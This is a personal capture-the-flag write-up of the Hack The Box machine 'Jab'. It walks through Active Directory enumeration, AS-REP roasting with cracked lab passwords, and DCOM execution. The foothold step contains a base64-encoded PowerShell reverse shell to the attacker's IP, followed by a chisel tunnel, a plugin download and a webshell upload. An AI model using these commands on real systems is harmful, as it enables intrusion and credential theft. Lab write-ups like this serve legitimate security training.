---
tags:
  - HTB
  - Retired
  - Windows
  - ASREP
  - ASREPRoast
  - DCOM
  - chisel
creation date: 2024-02-24
Date Completed: 2024-11-08
CVEs: CVE-2023-32315
URL: https://app.hackthebox.com/machines/589
IP: 10.129.210.4
New Tools: wmi-client, dcomexec.py, chisel
---
## Information Gathering
#### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
53/tcp    open  domain              Simple DNS Plus
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-11-01 21:26:42Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-01T21:28:10+00:00; +9s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-11-01T21:28:10+00:00; +9s from scanner time.
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-11-01T21:28:11+00:00; +9s from scanner time.
3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-01T21:28:10+00:00; +9s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
5222/tcp  open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     stream_id: 9isp3a6m2u
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    features: 
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
5223/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|     features: 
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|_    capabilities: 
5262/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     stream_id: 1gy2kxln74
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    features: 
5263/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|     features: 
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|_    capabilities: 
|_ssl-date: TLS randomness does not represent time
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|     features: 
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|_    capabilities: 
5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     stream_id: 6snw3krnys
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    features: 
5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     xmpp: 
|     features: 
|     compression_methods: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|_    capabilities: 
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp  open  realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 01 Nov 2024 21:26:42 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 01 Nov 2024 21:26:47 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp  open  ssl/oracleas-https?
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 01 Nov 2024 21:26:49 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 01 Nov 2024 21:26:54 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7777/tcp  open  socks5              (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9389/tcp  open  mc-nmf              .NET Message Framing
47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc               Microsoft Windows RPC
49665/tcp open  msrpc               Microsoft Windows RPC
49666/tcp open  msrpc               Microsoft Windows RPC
49667/tcp open  msrpc               Microsoft Windows RPC
49673/tcp open  msrpc               Microsoft Windows RPC
49692/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49693/tcp open  msrpc               Microsoft Windows RPC
49698/tcp open  msrpc               Microsoft Windows RPC
49707/tcp open  msrpc               Microsoft Windows RPC
49721/tcp open  msrpc               Microsoft Windows RPC
62660/tcp open  msrpc               Microsoft Windows RPC

```

### 53 - dns

```
dnsrecon -D /opt/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -d jab.htb -n 10.129.210.4
```

![[Pasted image 20241101183159.png]]

```
_kerberos._udp.jab.htb
_ldap._tcp.jab.htb
_gc._tcp.jab.htb
_kerberos._tcp.jab.htb
_ldap._tcp.dc._msdcs.jab.htb
_kpasswd._tcp.jab.htb
_ldap._tcp.ForestDNSZones.jab.htb
_ldap._tcp.pdc._msdcs.jab.htb
_kpasswd._udp.jab.htb
_ldap._tcp.gc._msdcs.jab.htb
_kerberos._tcp.dc._msdcs.jab.htb
```


### 88 - kerberos
```
./kerbrute_linux_amd64 userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -d jab.htb --dc 10.129.210.4
```

so every name in the book was returning as valid... going to assume this isn't the path...

![[Pasted image 20241101201139.png]]

jdavis@jab.htb is a real user...

```
../share/kali_backup/tools/kerbrute_linux_amd64 userenum users -d jab.htb --dc 10.129.210.4
```
all are real users
### 139, 445 - smb

no shares listed with `smbclient -N -L  \\\\10.129.210.4\\`

```
netexec smb 10.129.210.4 -u jdavis -p ../share/kali_backup/tools/rockyou.txt --ignore-pw-decoding
```

### 135, 593 - rcp 
requires creds

```
rpcclient \\\\10.129.210.4
```

### 389, 636, 3268, 3269 - ldap

```
ldapsearch -H ldap://jab.htb/ -x -s base -b ''
```

some info revealed here but i dont' see anything useful. I tried a bunch of other ldap queries and got nothing but an error saying a bind is required.

lets try... ASREProasting

```
GetNPUsers.py jab.htb/ -usersfile users -format hashcat -outputfile hashes.asreproast
```
### 5222 - jabber
Used for client-to-server communications in Jabber/XMPP.
pidgin

register new user
hacker@jab.htb
password

to obtain users:
1. open pigdin, create user
2. Help > Debug Window
3. Account > hacker@jab.htb > Find Users
4. Query * users and watch the debug windows lightup
5. Save to a file (example: debug_log)

user: a bunch

Cleaning the users file
```
cat debug_log | grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' "$@" * | sort | uniq
```


NOTE:

i tried this but couldn't get anywhere with it https://igniterealtime.atlassian.net/browse/OF-1110
```
<iq type='set' id='passwd_change'><query xmlns=jabber:iq:auth><username>jdavis</username><password>password</password></query></iq>
```

### 5269 - Wildfire XMPP Client
Used for server-to-server communications in Jabber/XMPP.

http://jab.htb:5269/
```
<stream></stream>
```

### 7070
Openfire HTTP Binding Service
http://jab.htb:7070/


### 7443 - oracleas-https
Secure communication for Oracle Application Server.
### 7777 - cbt (Common Business Oriented Language)

Often used for Oracle applications or custom business applications.

# Finding Creds
## ASREProasting

```
GetNPUsers.py jab.htb/ -usersfile users -format hashcat -outputfile hashes.asreproast
```

```
hashcat -m 18200 --force -a 0 hashes.asreproast ../share/kali_backup/tools/rockyou.txt
```

```
jmontgomery@jab.htb:Midnight_121
```


## Bloodhound

```
bloodhound-python -u jmontgomery -p 'Midnight_121' -d jab.htb -dc dc01.jab.htb -ns 10.129.210.4 -c All
```

Shortest Path from Owned Principals:
![[Pasted image 20241101231758.png]]

![[Pasted image 20241101231731.png]]
## Jabber
figured while i collect bloodhound data i would go back to jabber and see if there's anything there... sure as shit... 

![[Pasted image 20241101230620.png]]

jdavis has been a bad boy...

![[Pasted image 20241101230840.png]]
![[Pasted image 20241101230905.png]]
![[Pasted image 20241101230921.png]]

```
$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$de17a01e2449626571bd9416dd4e3d46$4fea18693e1cb97f3e096288a76204437f115fe49b9611e339154e0effb1d0fcccfbbbb219da829b0ac70e8420f2f35a4f315c5c6f1d4ad3092e14ccd506e9a3bd3d20854ec73e62859cd68a7e6169f3c0b5ab82064b04df4ff7583ef18bbd42ac529a5747102c2924d1a76703a30908f5ad41423b2fff5e6c03d3df6c0635a41bea1aca3e15986639c758eef30b74498a184380411e207e5f3afef185eaf605f543c436cd155823b7a7870a3d5acd0b785f999facd8b7ffdafe6e0410af26efc42417d402f2819d03b3730203b59c21b0434e2e0e7a97ed09e3901f523ba52fe9d3ee7f4203de9e857761fbcb417d047765a5a01e71aff732e5d5d114f0b58a8a0df4ca7e1ff5a88c532f5cf33f2e01986ac44a353c0142b0360e1b839bb6889a54fbd9c549da23fb05193a4bfba179336e7dd69380bc4f9c3c00324e42043ee54b3017a913f84a20894e145b23b440aff9c524efb7957dee89b1e7b735db292ca5cb32cf024e9b8f5546c33caa36f5370db61a9a3facb473e741c61ec7dbee7420c188e31b0d920f06b7ffc1cb86ace5db0f9eeaf8c13bcca743b6bf8b2ece99dd58aff354f5b4a78ffcd9ad69ad8e7812a2952806feb9b411fe53774f92f9e8889380dddcb59de09320094b751a0c938ecc762cbd5d57d4e0c3d660e88545cc96e324a6fef226bc62e2bb31897670929571cd728b43647c03e44867b148428c9dc917f1dc4a0331517b65aa52221fcfe9499017ab4e6216ced3db5837d10ad0d15e07679b56c6a68a97c1e851238cef84a78754ff5c08d31895f0066b727449575a1187b19ad8604d583ae07694238bae2d4839fb20830f77fffb39f9d6a38c1c0d524130a6307125509422498f6c64adc030bfcf616c4c0d3e0fa76dcde0dfc5c94a4cb07ccf4cac941755cfdd1ed94e37d90bd1b612fee2ced175aa0e01f2919e31614f72c1ff7316be4ee71e80e0626b787c9f017504fa717b03c94f38fe9d682542d3d7edaff777a8b2d3163bc83c5143dc680c7819f405ec207b7bec51dabcec4896e110eb4ed0273dd26c82fc54bb2b5a1294cb7f3b654a13b4530bc186ff7fe3ab5a802c7c91e664144f92f438aecf9f814f73ed556dac403daaefcc7081957177d16c1087f058323f7aa3dfecfa024cc842aa3c8ef82213ad4acb89b88fc7d1f68338e8127644cfe101bf93b18ec0da457c9136e3d0efa0d094994e1591ecc4:!@#$%^&*(1qazxsw
```

![[Pasted image 20241101231156.png]]

# Enumeration w/Credentials
trying to find a way to actually execute commands on the system 

## smbclient
both have access but nothing good
```
smbclient \\\\10.129.210.4\\SYSVOL -U 'jab.htb\svc_openfire'
smbclient \\\\10.129.210.4\\SYSVOL -U 'jab.htb\jmontgomery'
```

## Invoke-DCOM

The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and ExcelDDE). LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile).

One can manually instantiate and manipulate COM objects on a remote machine using the following PowerShell code. If specifying a COM object by its CLSID:

```
$ComputerName = DC01.JAB.HTB  # Remote computer
$clsid = "{fbae34e8-bf95-4da8-bf98-6c6e580aa348}"      # GUID of the COM object
$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)
```

If specifying a COM object by its ProgID:

```
$ComputerName = DC01.JAB.HTB  # Remote computer
$ProgId = "<NAME>"      # GUID of the COM object
$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)
```

Yeah thats cool and all  but its not working from linux using pwsh... lets try something else

## wmi-client

```
wmis -U 'jab.htb/svc_openfire%!@#$%^&*(1qazxsw' //10.129.210.4
```

```
wmis -U 'jab.htb/jmontgomery%Midnight_121' //10.129.210.4
```

## certipy

```
certipy find -username jmontgomery@jab.htb -password 'Midnight_121' -dc-ip 10.129.210.4
```

```
certipy find -username svc_openfire@jab.htb -password '!@#$%^&*(1qazxsw' -dc-ip 10.129.210.4
```

## psexec.py

```
psexec.py jab.htb/jmontgomery:'Midnight_121'@10.129.210.4
```
```
psexec.py jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.129.210.4
```

# Foothold
## dcomexec.py

https://medium.com/@iamkumarraj/exploring-impacket-dcomexec-enhancing-active-directory-attack-capabilities-a9663d383703

```
dcomexec.py -share C$ -object MMC20 'JAB.HTB/svc_openfire:!@#$%^&*(1qazxsw@dc01.jab.htb'
```

```
dcomexec.py -object MMC20 JAB.HTB/svc_openfire:'!@#$%^&*(1qazxsw'@10.129.210.4 'cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4ANgA0ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -silentcommand
```

![[Pasted image 20241102003415.png]]

# Internal Enumeration

`PS C:\Program Files\Openfire\conf> type openfire.xml`

![[Pasted image 20241102004457.png]]
![[Pasted image 20241102004626.png]]
`PS C:\Program Files\Openfire\conf> type security.xml`
![[Pasted image 20241102005735.png]]

`PS C:\Program Files\Openfire\embedded-db> type openfire.properties`
all the things are in here 💰🤑💲

user: admin aka administrator
salt: q6Ws2+ZEcDab+zFdBmYDQdWIaZwbfn6z
hash: b3623187c74becad09de392aa14b0b08427dc47a78c232aa6bc63423d20e133c0473e10622652724989ca9655a8f87eff512c1ac13ac47cfa6ca3cd3687a81dd868a5cc48cef5a5e

# Privilege Escalation
## Chisel

On Kali
```
/chisel server -v -p 8081 --reverse
```

On victim (windows)
```
.\chisel.exe client 10.10.15.64:8081 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
```

- Navigate to http://127.0.0.1:9090 in firefox (no proxychains or foxyproxy needed)
- Log in as svc_openfire
- goto tab plugin > upload plugin `openfire-management-tool-plugin.jar`
- goto tab server > server settings > Management tool
- Access webshell with password "123"

iwr http://10.10.15.64:8000/openfire-management-tool-plugin.jar -outfile openfire-management-tool-plugin.jar

![[Pasted image 20241102025234.png]]
